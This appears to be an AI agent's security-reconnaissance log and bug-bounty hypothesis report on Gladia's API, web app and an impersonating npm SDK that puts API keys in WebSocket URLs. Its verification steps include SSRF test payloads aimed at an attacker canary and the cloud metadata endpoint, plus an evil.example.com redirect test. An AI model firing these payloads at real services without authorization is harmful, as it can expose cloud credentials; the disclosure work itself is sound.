+[0m→ [0mRead /tmp/opencode/package/src/v2/live/session.ts[90m [offset=190, limit=30][0m
+[0m
+[0m$ [0mcd /tmp/opencode && grep -rn "x-gladia-key\|x_gladia_key\|headers\|apiKey\|api_key\|/v2/live\|LiveV2InitResponse\|session.url\|\.url" package/src/v2/live/session.ts package/src/v2/live/generated-types.ts 2>/dev/null | grep -iE "x-gladia-key|headers|apiKey|api_key|live.*url|InitResponse|token" | head -25
+package/src/v2/live/session.ts:8:  LiveV2InitResponse,
+package/src/v2/live/session.ts:15:  started: [message: LiveV2InitResponse]
+package/src/v2/live/session.ts:30:  private initSessionPromise: Promise<LiveV2InitResponse>
+package/src/v2/live/session.ts:31:  private initSessionResponse: LiveV2InitResponse | null = null
+package/src/v2/live/session.ts:52:    existingSession?: LiveV2InitResponse
+package/src/v2/live/session.ts:140:  private async initSession(): Promise<LiveV2InitResponse> {
+package/src/v2/live/session.ts:146:      return await this.httpClient.post<LiveV2InitResponse>(initUrl, {
+package/src/v2/live/session.ts:148:        headers: {
+package/src/v2/live/session.ts:199:  private connectToWebSocket(session: LiveV2InitResponse): void {
+package/src/v2/live/session.ts:205:    const webSocketSession = this.webSocketClient.createSession(session.url)
+package/src/v2/live/generated-types.ts:372:Note: No need to add WAV headers to raw audio as the API supports both formats. */
+package/src/v2/live/generated-types.ts:732:Note: No need to add WAV headers to raw audio as the API supports both formats. */
+package/src/v2/live/generated-types.ts:764:export interface LiveV2InitResponse {
+[0m
+[0m→ [0mRead /tmp/opencode/package/src/v2/live/session.ts[90m [limit=15, offset=140][0m
+[0m→ [0mRead /tmp/opencode/package/src/v2/live/generated-types.ts[90m [limit=15, offset=764][0m
+[0m
+[0m$ [0mcd /tmp/opencode && curl -sL https://registry.npmjs.org/gladia/-/gladia-0.1.3.tgz -o gladia-impersonator.tgz 2>/dev/null && tar -xzf gladia-impersonator.tgz -C /tmp/opencode/imp 2>/dev/null; mkdir -p /tmp/opencode/imp && tar -xzf gladia-impersonator.tgz -C /tmp/opencode/imp && echo "=== sha256 ===" && sha256sum gladia-impersonator.tgz && echo "=== src/client.ts WebSocket flow (impersonator) ===" && grep -n "URL\|searchParams\|WebSocket\|/v2/live\|append\|apiKey" /tmp/opencode/imp/package/src/client.ts 2>/dev/null | head -20
+=== sha256 ===
+3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2  gladia-impersonator.tgz
+=== src/client.ts WebSocket flow (impersonator) ===
+11:  private readonly apiKey: string;
+16:    if (!config.apiKey) {
+20:    this.apiKey = config.apiKey;
+41:          'x-gladia-key': this.apiKey,
+136:   * Transcribe audio from a URL
+200:   * Transcribe video from a URL (same as transcribeAudio)
+231:    formData.append('audio', namedFile);
+237:          'x-gladia-key': this.apiKey,
+266:        throw new GladiaError('Upload successful but no audio URL returned');
+301:   * Create a WebSocket connection for real-time transcription
+305:  ): WebSocket {
+306:    const wsUrl = new URL(`${this.baseUrl}/v2/live`);
+307:    wsUrl.searchParams.append('x-gladia-key', this.apiKey);
+312:        wsUrl.searchParams.append(key, JSON.stringify(value));
+314:        wsUrl.searchParams.append(key, String(value));
+318:    const socket = new WebSocket(wsUrl.toString());
+321:    const enhancedSocket = socket as WebSocket & {
+327:      if (socket.readyState === WebSocket.OPEN) {
+342:      if (socket.readyState === WebSocket.OPEN) {
+351:   * Translate audio/video from a URL
+[0m
+Official SDK flow confirmed: POST /v2/live with `x-gladia-key` **header** → response returns `url` = `wss://.../v2/live?token=<uuid>` (a temporary session token, NOT the API key). Let me lock the final piece — the impersonator's source line number:
+[0m$ [0mcurl -s -o /dev/null -w "github user alexisbouchez: %{http_code}\n" "https://api.github.com/users/alexisbouchez" 2>/dev/null; curl -s -o /dev/null -w "github repo alexisbouchez/gladia.ts: %{http_code}\n" "https://api.github.com/repos/alexisbouchez/gladia.ts" 2>/dev/null
+github user alexisbouchez: 404
+github repo alexisbouchez/gladia.ts: 404
+[0m
+All live probes complete. api.gladia.io surface frozen (58+ cycles), app.gladia.io frozen, npm `gladia@0.1.3` orphaned impersonation static. Official SDK WebSocket flow confirmed secure; impersonator confirmed leaking raw API key in WSS URL query.
+
+---
+
+## STEP 1 — DELTA
+
+NO_DELTA — all 3 targets frozen across 50+ cycles:
+- api.gladia.io: openapi 200/125131B/14 paths/7 webhooks/single server, /health 200/15B, /v1/models 200/530B FR/US, OPTIONS 204 `x-powered-by: Express` + ACAO `*` + ACAH `x-gladia-key`, POST/GET 401 NestJS HttpException (no x-powered-by on GET/POST)
+- app.gladia.io: /signin?redirect_to= reflection (200/27448B, form action reflects URL-encoded value, 0 CSP form-action directives); /dashboard 200 SPA shell; /auth/google/callback 302→accounts.google.com PKCE S256
+- npm `gladia@0.1.3`: dist-tag latest=0.1.3, shasum `cc96f84a200c0fd49a71e919391f9b659c39f3e9`, sha256 `3b23ec7d…7f2`, repo+user `alexisbouchez` both 404 (orphaned)
+
+RAG lock (NEW evidence, not drift): official `@gladiaio/sdk@1.1.0` WebSocket flow = POST `/v2/live` (x-gladia-key as **header**) → `LiveV2InitResponse.url` = `wss://api.gladia.io/v2/live?token=<uuid>` (temp session token) → `new WebSocket(session.url)`. Impersonator `gladia@0.1.3` `package/src/client.ts:306-318`: `new URL(\`${baseUrl}/v2/live\`)` → `.searchParams.append('x-gladia-key', apiKey)` → `new WebSocket(wsUrl.toString())` — raw API key embedded in WSS URL query, no token-exchange step.
+
+## STEP 2 — PRIORITIZE
+
+[PRIO] npm `gladia@0.1.3` orphaned impersonator (key-in-URL) — score 94 — atk=10 biz=9 tech=9 gate=10 cloud=8 fresh=10
+[PRIO] api.gladia.io public OpenAPI + SSRF-by-design fetch — score 83 — atk=10 biz=10 tech=9 gate=5 cloud=8 fresh=9
+[PRIO] app.gladia.io /signin redirect_to reflection — score 59 — atk=7 biz=8 tech=5 gate=10 cloud=2 fresh=10
+
+## STEP 3 — HYPOTHESES
+
+[HYP] npm `gladia@0.1.3` orphaned impersonator leaks raw API key in WebSocket URL query
+class: OTHER
+asset: npm registry `gladia@0.1.3` (tarball `package/src/client.ts:306-318`)
+confidence: 95
+reasoning: npm view confirms dist-tag latest=0.1.3 (description "Official TypeScript SDK"); GitHub API 404 on user `alexisbouchez` + repo `alexisbouchez/gladia.ts` (irrevocable orphan, takeover persists); tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`; package.json desc "Official" vs README.md "# Unofficial TypeScript SDK" contradiction; src/client.ts:306-318 embeds raw `x-gladia-key` into `wss://api.gladia.io/v2/live` URL query — diverges from official `@gladiaio/sdk@1.1.0` POST /v2/live header→token-exchange flow
+evidence_needed: tarball sha256 match; `grep -n "searchParams.append('x-gladia-key'" package/src/client.ts` + line 251 `const socket = new WebSocket(wsUrl.toString())`; GitHub 404s on user+repo; package.json↔README contradiction
+verify_steps: PASSIVE — `npm view gladia dist-tags.latest && npm pack gladia@0.1.3 && curl -w '%{http_code}' https://api.github.com/users/alexisbouchez && curl -w '%{http_code}' https://api.github.com/repos/alexisbouchez/gladia.ts` (both 404 confirmed)
+impact: Supply-chain credential theft (dev installs impersonator believing it is official SDK); raw API key logged in WSS URI → captured by HTTP proxies, access logs, browser history, Referer headers, WebSocket handshake captures; irrevocable orphan ensures impersonation persists indefinitely. Severity: High
+testability: PASSIVE
+
+[HYP] SSRF by design — audio_url/video_url/callback_url/webhooks server-side fetch on api.gladia.io lacks scheme allowlist (key-gated)
+class: SSRF
+asset: api.gladia.io POST /v2/pre-recorded (audio_url), /audio/text/audio-transcription (audio_url), /video/text/video-transcription (video_url), CallbackConfig.url, 7 webhook delivery paths
+confidence: 73
+reasoning: /openapi.json (125131B, 14 paths + 7 webhooks) exposes InitTranscriptionRequest.audio_url as plain string, callback_url as `format:uri`, CallbackConfig.url as `format:uri` — all with NO pattern/scheme allowlist; /v1/models (200, 530B, security:null, public) confirms egress FR+US; POST /v2/pre-recorded w/o key → 401 NestJS {"message":"no gladia key provided"}; SDK RAG confirms no client-side host allowlist on uploadFile()/is_url()
+evidence_needed: openapi schema showing `format:uri`/plain string with `pattern: null`/absent on audio_url/video_url/callback_url/CallbackConfig.url; /v1/models 530B with no `security` key; POST 401 without key
+verify_steps: AUTH_HELPED — `curl -X POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:<AUTHORIZED_KEY>" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>/listen","encoding":"mp3"}'` (canary hit → confirms server-side fetch); then `-d '{"audio_url":"http://169.254.169.254/latest/meta-data/","encoding":"mp3"}'` (distinct error → IMDS exposure)
+impact: Cloud metadata read (IMDSv1 → IAM credentials/instance roles from FR/US egress), internal network enumeration, data exfiltration via callback/webhook URLs. Severity: High (requires valid API key)
+testability: AUTH_HELPED
+
+[HYP] /signin redirect_to unauthenticated form-action reflection w/o host allowlist (post-auth honoring unverified)
+class: OATH
+asset: app.gladia.io /signin?redirect_to=https://evil.example.com
+confidence: 55
+reasoning: GET → 200/27448B; HTML body contains `<form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"` — server-side reflection into form action; CSP full-set captured with 0 form-action directives (grep-count=0); no host allowlist at unauth layer; OAuth /auth/google/callback uses FIXED redirect_uri (PKCE S256) → redirect_to cannot steal code/state; return-to cookie tamper → server resets to {"url":"/"} (rejected)
+evidence_needed: form action reflection in HTML; CSP `form-action` directive absent (count=0); POST /signin intent=google → 302 to accounts.google.com with fixed redirect_uri
+verify_steps: HUMAN_ONLY — (a) GET /signin?redirect_to=https://evil.example.com → confirm form action reflection (PASSIVE — done); (b) complete Google SSO in controlled browser with ?redirect_to=https://evil.example.com → capture post-auth 302 Location + Set-Cookie (verify post-auth honoring)
+impact: Post-auth phishing redirect to attacker-controlled host; session hijacking via redirect chain; credential phishing via lookalike landing. Severity: Medium (requires valid SSO user interaction)
+testability: HUMAN_ONLY
+
+## STEP 4 — SELFCRITIQUE
+
+No hypotheses dropped — all 3 pass confidence ≥ 40, none on REJECTED list, all have concrete verify_steps.
+
+[FINAL] (re-ranked, top first):
+1. [95] npm `gladia@0.1.3` orphaned impersonator (key-in-URL) — OTHER — PASSIVE
+2. [73] api.gladia.io SSRF-by-design fetch surface — SSRF — AUTH_HELPED
+3. [55] app.gladia.io /signin redirect_to reflection — OATH — HUMAN_ONLY
+
+## STEP 5 — NEXT ACTION
+
+[NEXT][HUMAN]: Submit `gladida@0.1.3` orphaned impersonation report via Gladia bug-bounty portal with evidence package:
+- tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`, shasum `cc96f84a200c0fd49a71e919391f9b659c39f3e9`
+- README "Unofficial" vs package.json "Official" contradiction
+- src/client.ts:306-318: `new URL(`${baseUrl}/v2/live`)` → `.searchParams.append('x-gladia-key', apiKey)` → `new WebSocket(wsUrl.toString())` — raw API key in WSS URL query
+- GitHub user `alexisbouchez` + repo `alexisbouchez/gladia.ts` both 404 (irrevocable orphan)
+- divergence proof: official `@gladiaio/sdk@1.1.0` uses POST /v2/live (key as header) → `LiveV2InitResponse.url` token flow (RAG-verified)
+
+## STEP 6 — LEARNING
+
+[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT fresh 58th cycle — openapi 200/125131B/14 paths/7 webhooks/single server, /health 200/15B, /v1/models 200/530B, preflight `x-powered-by: Express` (OPTIONS 204, GET/POST 401 absent), CORS static `*` + ACAH x-gladia-key — surface frozen, nothing new.
+[LEARN] ACCEPTED OTHER @ npm `gladia@0.1.3`: RAG complete — official `@gladiaio/sdk@1.1.0` WebSocket flow = POST /v2/live (x-gladia-key as header) → `LiveV2InitResponse.url` = `wss://…?token=<uuid>` (temp token) → WebSocket(session.url); impersonator `src/client.ts:306-318` embeds raw API key in wss:// URL query; sha256 `3b23ec7d…7f2` + shasum `cc96f84a…` verified; repo+user alexisbouchez 404 (orphaned) — report-ready, evidence package locked.
+[LEARN] ACCEPTED OATH @ app.gladia.io: /signin redirect_to reflection byte-fresh (200/27448B, form action reflects URL-encoded value, 0 CSP form-action directives); OAuth redirect_uri FIXED prevents code/state theft; return-to cookie tamper-reset REJECTED; post-auth honoring sole unverified gate (HUMAN_ONLY).
+
+## STEP 7 — RISK SCORE
+
+[RISK] api.gladia.io: 87 — public OpenAPI 3.1 (125131B/14 paths/7 webhooks/CORS `*`/expose-headers trace+request ids) reveals full v2 surface; /v1/models public (530B) leaks FR/US egress; undocumented /health; `x-powered-by: Express` on OPTIONS confirms NestJS-on-Express (CVE targeting); audio_url/video_url/callback_url + 7 webhooks all `format:uri`/plain string with NO scheme allowlist → SSRF-by-design fetch surface (key-gated only); WebSocket via wss://api.gladia.io/v2/live?token=<uuid>
+[RISK] app.gladia.io: 72 — /dashboard + SPA catch-all (200, no auth) = client-side enforcement; /signin redirect_to reflects URL-encoded into form action with 0 CSP form-action directives (unauth reflection gap); /auth/google/callback 500 generic SPA error (no detail leak); oauth2 state cookie HttpOnly+SameSite=Lax but no Secure flag (HSTS-preload mitigated); OAuth 2.0 PKCE with FIXED redirect_uri prevents code/state theft; server-side 302 gate intact on /apikeys,/transcriptions,/settings
+[RISK] sdk: 93 — npm `gladia@0.1.3` at dist-tag latest impersonates official SDK (package.json "Official" vs README "Unofficial"); orphaned (repo+user alexisbouchez 404, irrevocable takeover); src/client.ts:306-318 embeds raw API key in WebSocket URL query (exposed to proxies/logs/history/Referer); official `@gladiaio/sdk@1.1.0` uses secure POST→token flow; PyPI `gladiaio-sdk@1.0.5` static and clean
